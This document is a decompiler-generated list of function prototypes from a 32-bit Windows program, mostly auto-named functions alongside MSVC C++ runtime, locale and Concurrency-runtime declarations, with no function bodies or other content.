// _DWORD __cdecl std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Iput(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
void __cdecl sub_43CDA1(std::_Locinfo *a1, int a2, struct std::locale::_Locimp *a3, std::locale *a4);
void __cdecl sub_43D2D2(std::_Locinfo *a1, int a2, struct std::locale::_Locimp *a3, std::locale *a4);
// _DWORD __stdcall unknown_libname_59(_DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD); weak
// _DWORD __cdecl std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Put(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
int __stdcall sub_43D955(int a1, int a2, int a3, char a4, int a5, unsigned __int16 a6, char a7, void *Src, int a9, int a10, int a11, unsigned int a12, unsigned int a13, unsigned __int16 a14);
int __stdcall sub_43DF86(int a1, int a2, int a3, char a4, int a5, unsigned __int16 a6, char a7, void *Src, int a9, int a10, int a11, unsigned int a12, unsigned int a13, unsigned __int16 a14);
// _DWORD __cdecl std::money_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::_Rep(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int unknown_libname_61(void); weak
// int __thiscall unknown_libname_62(_DWORD); weak
// _DWORD __stdcall std::allocator<wchar_t>::allocate(_DWORD); weak
// int __stdcall std::wstring::assign(void *Src); idb
int __stdcall sub_43E870(int a1, int a2, int a3, int a4);
int __thiscall sub_43E8FC(_DWORD *this);
__int16 __thiscall sub_43E900(_WORD *this);
int __thiscall sub_43E90F(_DWORD *this);
int __stdcall sub_43E913(int a1, int a2, int a3, int a4, void *Src); // idb
_DWORD *__stdcall sub_43E933(_DWORD *a1, int a2, int a3, int a4, _DWORD *Src);
int *__thiscall sub_43EC57(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _WORD *a9);
_DWORD *__stdcall sub_43ED45(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8);
// _DWORD __stdcall unknown_libname_66(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
int *__thiscall sub_43F13D(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
int *__thiscall sub_43F5CC(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _WORD *a9);
_DWORD *__stdcall sub_43F6BA(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8);
// _DWORD __stdcall unknown_libname_70(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
_DWORD *__thiscall sub_43F885(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, float *a9);
_DWORD *__thiscall sub_43F980(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, double *a9);
_DWORD *__thiscall sub_43FA71(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, double *a9);
int *__thiscall sub_43FAB2(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
int *__thiscall sub_43FF41(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, int *a8, _DWORD *a9, char a10, int a11);
int *__thiscall sub_4402E6(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, int *a8, _DWORD *a9, char a10, int a11);
_DWORD *__thiscall sub_4412AB(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, int a9);
_DWORD *__thiscall sub_441340(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, int a9);
_DWORD *__thiscall sub_441542(void **this, _DWORD *a2);
_DWORD *__thiscall sub_441557(void **this, _DWORD *a2);
int __stdcall sub_44156C(int a1, int a2);
int __thiscall sub_441C86(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_441CF1(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X);
int __thiscall sub_441E32(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X);
int __thiscall sub_44203C(void *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
int __thiscall sub_4422C9(void *this, int a2, int a3, int a4, int a5, int a6, int a7);
int __thiscall sub_442334(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X);
int __thiscall sub_442475(void *this, int a2, int a3, int a4, _DWORD *a5, int a6, double X);
int __thiscall sub_4425B6(void *this, int a2, int a3, int a4, int a5, int a6, const void *a7);
int __thiscall sub_44267F(void *this, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
__int16 __thiscall sub_442A25(_WORD *this);
int __stdcall sub_442C4E(char a1);
// _DWORD __stdcall std::istreambuf_iterator<wchar_t>::equal(_DWORD); weak
// int __thiscall unknown_libname_81(_DWORD); weak
// _DWORD __stdcall unknown_libname_82(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_83(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall unknown_libname_84(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// int __thiscall std::wstring::insert(void *Src, int, size_t N, wchar_t C); idb
// int __thiscall std::wstring::insert(void *Src, int, size_t N, wchar_t C); idb
// _DWORD __stdcall std::locale::name(_DWORD); weak
struct std::_Facet_base *__cdecl sub_443274(std::locale *a1);
struct std::_Facet_base *__cdecl sub_443309(std::locale *a1);
struct std::_Facet_base *__cdecl sub_44339E(std::locale *a1);
struct std::_Facet_base *__cdecl sub_443433(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4434C8(std::locale *a1);
struct std::_Facet_base *__cdecl sub_44355D(std::locale *a1);
struct std::_Facet_base *__cdecl sub_4435F2(std::locale *a1);
struct std::_Facet_base *__cdecl sub_443687(std::locale *a1);
_DWORD *__thiscall sub_44371C(_DWORD *this, std::_Locinfo *a2, int a3);
void __thiscall sub_44374F(_DWORD *this);
void __thiscall sub_443769(_DWORD *this);
_DWORD *__thiscall sub_4437B1(_DWORD *Block, char a2);
_DWORD *__thiscall sub_4437D3(_DWORD *Block, char a2);
_DWORD *__thiscall sub_443801(_DWORD *Block, char a2);
int __cdecl sub_443823(_Collvec **a1, int a2);
int __cdecl sub_4438C5(_DWORD *a1, std::locale *a2);
int __cdecl sub_44392D(_DWORD *a1, std::locale *a2);
int __cdecl sub_443995(_DWORD *a1, std::locale *a2);
int __cdecl sub_4439FD(_DWORD *a1, std::locale *a2);
int __cdecl sub_443A81(_DWORD *a1, std::locale *a2);
int __cdecl sub_443B06(_DWORD *a1, std::locale *a2);
int __cdecl sub_443B72(_DWORD *a1, std::locale *a2);
// _DWORD __stdcall std::time_get<char,std::istreambuf_iterator<char>>::_Getfmt(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl std::time_get<char,std::istreambuf_iterator<char>>::_Getint(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall std::_Mpunct<char>::_Init(_DWORD, char); weak
// int __stdcall std::time_get<char,std::istreambuf_iterator<char>>::_Init(std::_Locinfo *); idb
void __stdcall sub_444AC0(int a1);
_DWORD *__stdcall sub_4454CB(_DWORD *a1, int a2, int a3, int a4, _DWORD *Src);
int *__thiscall sub_445665(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, int *a8, _DWORD *a9, char a10, int a11);
_DWORD *__thiscall sub_44603A(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, int a9);
void **__thiscall sub_4460ED(void **this, void **a2);
// _DWORD __cdecl _Stoulx(_DWORD, _DWORD, _DWORD, _DWORD); weak
// void __thiscall _Init_atexit::~_Init_atexit(_Init_atexit *__hidden this); idb
// _Collvec __cdecl _Getcoll();
// int _Getdateorder(void); weak
// void __fastcall __security_check_cookie(uintptr_t StackCookie);
// void *__cdecl operator new(size_t Size); idb
void __cdecl sub_44775B(void *Block);
_DWORD *__thiscall sub_447769(_DWORD *Block, char a2);
// void __noreturn __report_rangecheckfailure(void); weak
// _DWORD __cdecl _Init_thread_footer(_DWORD); weak
// _DWORD __cdecl _Init_thread_header(_DWORD); weak
// int __cdecl atexit(void (__cdecl *)());
void __cdecl j_j__free(void *Block);
// int __cdecl unknown_libname_86(_DWORD); weak
void __cdecl sub_447DEF(void *Block);
// void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *)); idb
// void __stdcall `eh vector constructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *), void (__thiscall *)(void *)); idb
int sub_448031();
int sub_448039();
void __cdecl j__free(void *Block);
int __cdecl UserMathErrorFunction();
LPTOP_LEVEL_EXCEPTION_FILTER sub_4485C3();
// LONG __stdcall __scrt_unhandled_exception_filter(struct _EXCEPTION_POINTERS *ExceptionInfo); idb
void sub_448625();
void sub_448909();
void *sub_448936();
// int __scrt_initialize_default_local_stdio_options(void); weak
BOOL sub_448959();
void *sub_448965();
void *sub_44896B();
void sub_448971();
void __cdecl sub_44899D(); // idb
void __stdcall __noreturn sub_448A00(int a1);
BSTR __stdcall sub_448A20(LPCCH lpMultiByteStr);
_DWORD *__thiscall sub_448BB0(_DWORD *this, int a2);
_DWORD *__thiscall sub_448BF0(_DWORD *this, int a2, int a3, char a4);
HLOCAL __thiscall sub_448C40(void *this);
void *__thiscall sub_448C80(void *Block, char a2);
void __cdecl __noreturn sub_448CD0(int a1, int a2);
int __thiscall sub_448CF5(int this, int a2, char a3, unsigned __int8 a4);
_DWORD *__thiscall sub_448D31(_DWORD *this, char a2, int a3, char a4, unsigned __int8 a5);
int __thiscall sub_448DB8(int this, char a2);
_DWORD *__thiscall sub_448DE7(_DWORD *this, int a2, char a3, unsigned __int8 a4);
_DWORD *__thiscall sub_448E0F(_DWORD *this);
_DWORD *__thiscall sub_448E2F(_DWORD *this);
_DWORD *__thiscall sub_448E4C(_DWORD *this);
void __thiscall sub_448E6D(_DWORD *this);
unsigned int __thiscall sub_448E8D(_DWORD *this);
void __thiscall sub_448EAB(_DWORD *this);
void __thiscall sub_448EF7(_DWORD *this);
_DWORD *__thiscall sub_448F79(_DWORD *Block, char a2);
int __thiscall sub_448F9B(_DWORD **this);
void __thiscall sub_448FB5(volatile signed __int32 *Block);
void __stdcall sub_448FD3(int a1, void *Block, int a3);
HMODULE __stdcall sub_449031(int a1, int (__thiscall ***a2)(_DWORD, _DWORD, _DWORD), int a3);
void __stdcall sub_449064(void *Block, int a2);
void __stdcall sub_4490BD(PVOID a1, BOOLEAN a2); // idb
int sub_4490DF();
void __thiscall sub_449173(void *Block);
char __thiscall sub_44918C(volatile signed __int32 *Block);
int __thiscall sub_4491C1(int (__thiscall ****this)(_DWORD, _DWORD, _DWORD), int a2);
char __thiscall sub_4491E3(_DWORD *this, _DWORD *a2, int a3);
char __thiscall sub_44923D(int this, _DWORD *a2, int a3);
char __thiscall sub_449296(volatile signed __int32 *Block, _DWORD *a2, int a3);
char __thiscall sub_4492DD(volatile signed __int32 *Block, _DWORD *a2, int a3);
signed __int32 __thiscall sub_449320(volatile signed __int32 *this);
_DWORD *__thiscall sub_449364(void *Block, _DWORD *a2, int a3);
_DWORD *__cdecl sub_449419(_DWORD **a1, char a2);
int __thiscall sub_449453(_DWORD **this);
char __thiscall sub_44946C(_DWORD *this);
int __thiscall sub_44949F(_DWORD **this);
char __thiscall sub_4494B8(_BYTE *this);
char __thiscall sub_4494DC(_BYTE *this);
char __thiscall sub_44951F(_DWORD *this);
int __thiscall sub_449555(_DWORD *this, int a2);
int __thiscall sub_449573(_DWORD *this, int a2);
char __thiscall sub_449592(int this);
char __thiscall sub_44961B(_DWORD *this);
bool __thiscall sub_449692(char *Parameter, DWORD DueTime);
void __thiscall sub_4496F5(int this, unsigned __int8 a2);
void __thiscall sub_449742(_DWORD *this);
void __thiscall sub_4497AD(_DWORD *this);
void __thiscall sub_44982B(volatile __int32 *this);
signed __int32 __thiscall sub_449974(_DWORD ***this, void *a2);
unsigned int __thiscall sub_4499D8(_DWORD ***this, DWORD DueTime);
char __thiscall sub_449AB9(_DWORD ***this, void *a2, DWORD DueTime);
unsigned int __cdecl sub_449BA1(_DWORD *a1, unsigned int a2, char a3, DWORD DueTime);
HANDLE *__thiscall sub_449E48(HANDLE *Parameter, DWORD DueTime);
LPCRITICAL_SECTION __thiscall sub_449ED8(LPCRITICAL_SECTION lpCriticalSection);
_DWORD *__thiscall sub_449EED(_DWORD *this);
_DWORD *__thiscall sub_449EFD(_DWORD *this);
char *__thiscall sub_449F1D(char *this, int a2);
int __thiscall sub_449F38(int this, int a2);
void __thiscall sub_449F62(LPCRITICAL_SECTION lpCriticalSection);
void __thiscall sub_449F6A(void **this);
int __thiscall sub_449FA2(_DWORD *this, unsigned int a2);
_DWORD *sub_44A028();
void __thiscall sub_44A04A(volatile signed __int32 *Block);
HMODULE __stdcall sub_44A069(int a1, volatile signed __int32 *Block, int a3);
void __stdcall sub_44A0B0(volatile signed __int32 *Block, int a2);
void __thiscall sub_44A0FE(volatile signed __int32 *Block);
char __thiscall sub_44A123(volatile signed __int32 *this);
_DWORD *__thiscall sub_44A155(_DWORD *this, _DWORD *a2);
int __thiscall sub_44A1BD(_DWORD *this);
void __thiscall sub_44A1E8(LPCRITICAL_SECTION lpCriticalSection);
signed __int32 __thiscall sub_44A1F0(volatile signed __int32 *this);
signed __int32 __thiscall sub_44A220(volatile signed __int32 *this);
bool __thiscall sub_44A24E(int this, volatile signed __int32 *Block, char a3);
int __thiscall sub_44A2E9(int *this);
void __thiscall sub_44A2FF(_DWORD *this);
int sub_44A317(void); // weak
void __thiscall sub_44A32E(LPCRITICAL_SECTION lpCriticalSection);
void __thiscall sub_44A336(volatile signed __int32 *this);
void __thiscall sub_44A33A(volatile signed __int32 *this);
signed __int32 __thiscall sub_44A345(signed __int32 this, signed __int32 *a2);
char __thiscall sub_44A394(volatile signed __int32 *this);
DWORD sub_44A3AB();
int __cdecl sub_44A3B1(_DWORD *a1, int a2, int a3);
signed __int32 __thiscall sub_44A3EE(void *this);
char __thiscall sub_44A41C(signed __int32 this);
char __thiscall sub_44A467(void *this, DWORD DueTime);
void __thiscall sub_44A4C5(void *this);
// _DWORD __thiscall std::regex_error::regex_error(std::regex_error *__hidden this, const struct std::regex_error *); idb
void __thiscall sub_44A57F(char *this);
int sub_44A5CE();
BOOL __cdecl sub_44A677(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period);
BOOL __cdecl sub_44A68E(HANDLE hObject);
int __cdecl sub_44A69C(unsigned __int8 a1);
// int __cdecl __crtCreateSemaphoreExW_0(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); idb
BOOL __cdecl sub_44A707(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
int __cdecl sub_44A727(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent); // idb
int __cdecl sub_44A756(int a1);
struct _SYSTEM_LOGICAL_PROCESSOR_INFORMATION *__cdecl sub_44A778(PDWORD ReturnedLength);
void *__cdecl sub_44A7FF(int a1, size_t *a2);
ULONG sub_44A8B3();
int __cdecl sub_44A8F6(int a1, int a2);
int __cdecl sub_44A94F(HANDLE hThread); // idb
__int64 j____crtGetTickCount64(void); // weak
int __cdecl sub_44A962(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount); // idb
HANDLE __cdecl sub_44A977(HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context);
int __cdecl sub_44A9C7(HANDLE hThread, DWORD_PTR *a2);
BOOL __cdecl sub_44AA0B(HANDLE hThread, int nPriority);
DWORD __cdecl sub_44AA4D(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
void __cdecl sub_44AA64(DWORD dwMilliseconds);
// BOOL __stdcall SwitchToThread();
DWORD sub_44AA78();
BOOL __cdecl sub_44AAB5(DWORD dwTlsIndex);
LPVOID __cdecl sub_44AAC3(DWORD dwTlsIndex);
BOOL __cdecl sub_44AAD1(DWORD dwTlsIndex, LPVOID lpTlsValue);
BOOL __cdecl sub_44AB13(HANDLE WaitHandle);
DWORD __cdecl sub_44AB21(HANDLE hHandle, DWORD dwMilliseconds);
int __thiscall sub_44AB34(int this, char a2);
int *sub_44AB68();
int __cdecl sub_44AB76(int a1);
HMODULE __cdecl sub_44AB83(int a1);
HMODULE __cdecl sub_44ABBF(DWORD dwExitCode);
uintptr_t sub_44ABE9();
int __cdecl sub_44AC35(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); // idb
HMODULE sub_44AC7B();
int __cdecl sub_44AD0F(unsigned int a1, int a2, int a3, char a4);
int __cdecl sub_44AD6E(int a1, int a2, int a3);
HMODULE __cdecl sub_44ADA7(int a1, int a2);
HMODULE __cdecl sub_44ADDD(int a1, int a2);
__int32 __thiscall sub_44AE12(volatile __int32 *this);
__int32 __thiscall sub_44AE22(volatile __int32 *this);
int __thiscall sub_44AE53(_DWORD *this);
void sub_44AE5E();
char __thiscall sub_44AE67(volatile __int32 *this);
char __thiscall sub_44AE87(volatile __int32 *this);
int sub_44AE9C();
int sub_44AEC3();
int sub_44AEE0(void); // weak
_DWORD *__thiscall sub_44AEE5(_DWORD *this, int a2);
int __thiscall sub_44AF06(int this);
void *__thiscall sub_44AFEA(_DWORD *this);
// _DWORD __thiscall std::bad_function_call::bad_function_call(std::bad_function_call *__hidden this); idb
char *__thiscall sub_44B006(char *this, int a2);
void __thiscall sub_44B021(void **this);
void __thiscall sub_44B02E(char *this);
void __thiscall sub_44B101(LPCRITICAL_SECTION *this);
_DWORD *__thiscall sub_44B137(_DWORD *this);
// void *__thiscall Concurrency::details::GlobalCore::`vector deleting destructor'(Concurrency::details::GlobalCore *__hidden this, unsigned int); idb
void **__thiscall sub_44B1CA(void **Block, char a2);
int __thiscall sub_44B1F3(_DWORD *this, int a2);
unsigned int __thiscall sub_44B22C(int *this, unsigned int a2, unsigned int a3, unsigned int a4);
int __thiscall sub_44B2FC(_DWORD *this, int a2);
int __cdecl sub_44B31F(int *a1);
int __cdecl sub_44B34A(_DWORD *a1);
int __thiscall sub_44B371(DWORD_PTR *this, HANDLE hThread);
ULONG_PTR sub_44B383();
void sub_44B4A8();
_DWORD *__thiscall sub_44B4C3(_DWORD *this, int a2);
unsigned int __thiscall sub_44B5D0(_DWORD *this);
unsigned int __thiscall sub_44B5F3(_DWORD *this);
unsigned int *__thiscall sub_44B620(unsigned int *this);
BOOL __thiscall sub_44B757(LPVOID lpParameter);
_DWORD __cdecl sub_44B7B9();
char *__thiscall sub_44B7BE(void *this, int a2);
volatile signed __int32 *sub_44B820();
int __thiscall sub_44B8B3(int this, int a2, int a3);
unsigned int __thiscall sub_44B917(_DWORD *this);
void __thiscall sub_44B930(_DWORD *this, void **Block);
void __thiscall sub_44B96A(_DWORD *this);
_DWORD *__thiscall sub_44BC85(_DWORD *this);
bool __thiscall sub_44BCEA(_DWORD *this);
void __thiscall sub_44BE8A(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6);
void __thiscall sub_44BFC7(_DWORD *this, unsigned int a2, unsigned int a3);
int __thiscall sub_44C15A(int *this);
void __thiscall sub_44C39C(_DWORD *this, _DWORD *a2, int a3, int a4, char a5);
void __thiscall sub_44C409(_DWORD *this, _DWORD *a2, _DWORD *a3, int a4, unsigned int a5);
int __stdcall StartAddress(LPVOID lpThreadParameter); // idb
void __thiscall sub_44C595(int this);
unsigned int __thiscall sub_44C695(_DWORD *this, unsigned int *a2, unsigned int *a3, int a4, int a5, unsigned int a6);
unsigned int __thiscall sub_44C9D6(_DWORD *this, unsigned int a2, int a3, int a4);
char __thiscall sub_44CAF0(_DWORD *this, _DWORD *a2, _DWORD *a3, _DWORD *a4, unsigned int a5);
int __thiscall sub_44CBF9(_DWORD *this, __int16 a2);
_BYTE *__thiscall sub_44CC2D(_DWORD *this);
int __thiscall sub_44CC5D(_DWORD *this);
int sub_44CC61();
int __thiscall sub_44CCAC(_DWORD *this, unsigned int *a2);
int __thiscall sub_44CDA5(_DWORD *this);
int __thiscall sub_44CDAC(_DWORD *this);
int __thiscall sub_44CDB6(_DWORD *this);
int __thiscall sub_44CDBD(_DWORD *this);
int __thiscall sub_44CDC4(int *this);
int __thiscall sub_44CDDB(int *this);
int __thiscall sub_44CDF2(_DWORD *this, int a2);
int __thiscall sub_44CE17(_DWORD *this, int a2);
int sub_44CE3C();
int __thiscall sub_44CE87(_DWORD *this);
int sub_44CE8E(void); // weak
_DWORD __cdecl sub_44CE93();
int sub_44CE98(void); // weak
// unsigned int __cdecl Concurrency::details::platform::GetNextAsyncId(Concurrency::details::platform *__hidden this); idb
void *__cdecl sub_44CEAA(int a1);
unsigned int __thiscall sub_44CED3(_DWORD *this, _DWORD *a2, _DWORD *a3);
unsigned int __thiscall sub_44CFED(_DWORD *this, _DWORD *a2, _DWORD *a3);
void __thiscall sub_44D12E(_DWORD *this);
char __thiscall sub_44D164(int this, int a2, int a3, char a4);
unsigned int __thiscall sub_44D1A1(unsigned int *this, unsigned int a2, unsigned __int16 a3, unsigned __int16 a4, unsigned int a5, unsigned int a6, char a7);
void *__thiscall sub_44D2B4(int this);
void __cdecl sub_44D376(char a1);
unsigned int __thiscall sub_44D60B(_DWORD *this);
_DWORD *__thiscall sub_44D624(unsigned int *this, _DWORD *a2, int a3, char a4);
int __thiscall sub_44D77A(_DWORD *this, int a2, int a3, int a4);
_DWORD *__thiscall sub_44D840(_DWORD *this);
void __thiscall sub_44D95C(_DWORD *this);
unsigned int __thiscall sub_44DA2A(_DWORD *this);
unsigned int __thiscall sub_44DA59(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_44DC6B(_DWORD *this, int a2, unsigned int a3, unsigned int a4, unsigned int a5);
signed __int32 __thiscall sub_44E016(volatile signed __int32 *this);
char *__thiscall sub_44E020(void *this, int a2, int a3);
signed __int32 __thiscall sub_44E064(int this);
unsigned int __thiscall sub_44E10F(_DWORD *this, int a2, unsigned int a3, int a4);
char __thiscall sub_44E164(_DWORD *this, int a2, _DWORD *a3, int a4);
int __thiscall sub_44E24E(_DWORD *this, int a2);
void __thiscall sub_44E284(int this, DWORD_PTR *Block);
_DWORD *__thiscall sub_44E2FB(int this, _DWORD *a2, char a3);
unsigned int __thiscall sub_44E410(_DWORD *this, int a2, unsigned int a3);
unsigned int __thiscall sub_44E444(_DWORD *this, int a2, unsigned int a3, int a4);
int __thiscall sub_44E61F(_DWORD *this);
__int32 sub_44E676();
void __cdecl sub_44E764(int a1, unsigned int a2);
char __thiscall sub_44E91C(volatile signed __int32 *this);
void __thiscall sub_44E93B(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_44EB07(_DWORD *this, int a2, char a3);
int __thiscall sub_44EBCB(int this, _DWORD *a2);
_DWORD *__thiscall sub_44EC9D(int this, _DWORD *a2);
_DWORD *__thiscall sub_44ECF1(_DWORD *this, int a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6);
int sub_44ED58();
int __cdecl sub_44EDA1(int a1);
int __cdecl sub_44EDC4(int a1);
int __cdecl sub_44EDE9(int a1);
unsigned int *__thiscall sub_44EE0C(unsigned int *this, unsigned int a2);
PSLIST_HEADER __thiscall sub_44EE4A(PSLIST_HEADER ListHead, int a2, int a3, int a4);
_DWORD *__thiscall sub_44EF41(_DWORD *this, int a2, int a3, _DWORD *a4);
_DWORD *__thiscall sub_44EF79(_DWORD *this, int a2, int a3, _DWORD *a4);
void __thiscall sub_44EFB1(_DWORD *this);
_DWORD *__thiscall sub_44EFC9(_DWORD *this, int a2);
HANDLE *__thiscall sub_44F00F(HANDLE *this, const void **a2);
char *__thiscall sub_44F2E9(char *this, int a2);
char *__thiscall sub_44F304(char *this, int a2);
void __thiscall sub_44F332(PSLIST_HEADER ListHead);
void __thiscall sub_44F3D8(PSLIST_HEADER ListHead);
void __thiscall sub_44F472(void **this);
void __thiscall sub_44F493(void **this);
void __thiscall sub_44F4AA(_DWORD *this);
void __thiscall sub_44F4B8(char *this);
int __thiscall sub_44F571(_DWORD **this);
int __thiscall sub_44F5A7(_DWORD *this, int a2);
char *__thiscall sub_44F5EF(char *this, char a2);
_DWORD *__thiscall sub_44F674(_DWORD *Block, char a2);
void *__thiscall sub_44F697(void *Block, char a2);
_DWORD *__thiscall sub_44F6BC(_DWORD *Block, char a2);
_DWORD *__thiscall sub_44F702(_DWORD *Block, char a2);
_DWORD *__thiscall sub_44F725(_DWORD *Block, char a2);
char *__thiscall sub_44F748(char *Block, char a2);
char *__thiscall sub_44F76D(char *Block, char a2);
volatile signed __int32 *__thiscall sub_44F7F0(_DWORD *this, signed __int32 a2);
signed __int32 __thiscall sub_44F94C(volatile signed __int32 *this, int a2);
int __thiscall sub_44F97D(int *this, int a2);
_DWORD *__thiscall sub_44F9B1(void *this, _DWORD *a2);
void __thiscall sub_44F9DE(volatile signed __int32 *this, _DWORD *a2);
int __thiscall sub_44FA12(int this, int a2, unsigned int a3);
_DWORD *__thiscall sub_44FAA8(void *this, int a2, _DWORD *a3);
_DWORD *__thiscall sub_44FAE3(void *this, int a2, int a3);
int __thiscall sub_44FB2F(int this);
_DWORD *__thiscall sub_44FB75(volatile signed __int32 *this, char a2);
int __thiscall sub_44FBE5(volatile signed __int32 *this);
int __thiscall sub_44FC08(int this);
int __thiscall sub_44FC46(_DWORD *this, ULONG DueTime);
unsigned int __cdecl sub_44FD17(int a1);
unsigned int __cdecl sub_44FD23(int a1);
int *sub_44FD2F();
int *sub_44FD55();
char *__thiscall sub_44FDBA(int this);
int __thiscall sub_44FE6D(_DWORD *this);
int __thiscall sub_44FEB0(int *this, unsigned int a2);
unsigned int __thiscall sub_44FF50(_DWORD *this);
int __thiscall sub_44FFD9(int this, int a2);
_DWORD *sub_450017();
int *__thiscall sub_450043(int this, _DWORD *a2);
int *__thiscall sub_45004C(void *this);
HANDLE *__cdecl sub_45006B(int *a1);
int __thiscall sub_450091(int this);
signed __int32 __thiscall sub_4500AA(int this);
int __thiscall sub_4500C8(int *this);
int __thiscall sub_4500E5(int *this);
int __thiscall sub_4500FF(int *this);
int __thiscall sub_450133(HANDLE *this);
int __thiscall sub_45017E(volatile signed __int32 *this, struct _SINGLE_LIST_ENTRY *a2, char a3);
LPVOID sub_4501C0();
int sub_4501CD();
int __thiscall sub_4501E7(_DWORD *this);
int __thiscall sub_450204(_DWORD **this);
_DWORD *__thiscall sub_45032E(unsigned int *this, _DWORD *a2, _DWORD *a3);
int __thiscall sub_450364(void *this);
int __thiscall sub_4503A5(unsigned int *this, _DWORD *a2);
int __stdcall sub_4503FE(int a1, int a2, _DWORD *a3, _DWORD *a4);
int __thiscall sub_450429(_DWORD *this, int a2, int a3, _DWORD *a4);
char __thiscall sub_450458(unsigned int *this, __int32 *a2, int a3, int a4, int a5, int a6, int a7);
char __thiscall sub_450560(_DWORD *this);
char __thiscall sub_45058A(_DWORD *this);
int __thiscall sub_450654(_DWORD *this);
_DWORD *__thiscall sub_45065D(unsigned int *this, _DWORD *a2, _DWORD *a3);
int sub_450713();
_DWORD *__thiscall sub_4507B0(union _SLIST_HEADER *this, char a2);
int __thiscall sub_450810(int this, char a2);
signed __int32 __thiscall sub_450933(volatile signed __int32 *this);
signed __int32 __thiscall sub_450940(volatile signed __int32 *this);
// unsigned int __cdecl Concurrency::details::platform::GetNextAsyncId(Concurrency::details::platform *__hidden this); idb
int __thiscall sub_45095A(int this);
int __stdcall sub_45098F(_DWORD *a1, int a2, _DWORD *a3);
int __thiscall sub_4509CB(_DWORD *this, int a2, int a3);
int __thiscall sub_4509F4(_DWORD *this);
int __thiscall sub_450A15(_DWORD *this, int a2);
int __thiscall sub_450A37(_DWORD *this, _DWORD *a2, int a3);
_DWORD *__thiscall sub_450A6C(const void **this, _DWORD *a2);
int __thiscall sub_450A82(union _SLIST_HEADER *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3);
int __thiscall sub_450ADF(union _SLIST_HEADER *this);
int __thiscall sub_450AF6(int *this);
PSLIST_ENTRY __cdecl sub_450B09(char a1);
int __thiscall sub_450B89(_DWORD *this, int a2);
void __thiscall sub_450BAC(void *this, int a2);
void __thiscall sub_450C2B(void **this, int a2);
bool __thiscall sub_450C9C(_DWORD *this);
int __cdecl sub_450CAF(int a1, unsigned int a2);
int __thiscall sub_450CDB(_DWORD *this);
int __thiscall sub_450CE2(_DWORD *this);
void __thiscall sub_451194(volatile signed __int32 *this);
_DWORD *__thiscall sub_45119C(unsigned int *this, _DWORD *a2, _DWORD *a3);
int *__thiscall sub_451204(int this, _DWORD *a2);
signed __int32 __thiscall sub_4512CA(void *this);
bool __thiscall sub_451304(_DWORD *this, int a2);
int __thiscall sub_451340(int (__cdecl **this)(int), int (__cdecl *a2)(int), int (__cdecl *a3)(int), int a4);
int __thiscall sub_45137C(int this, int a2);
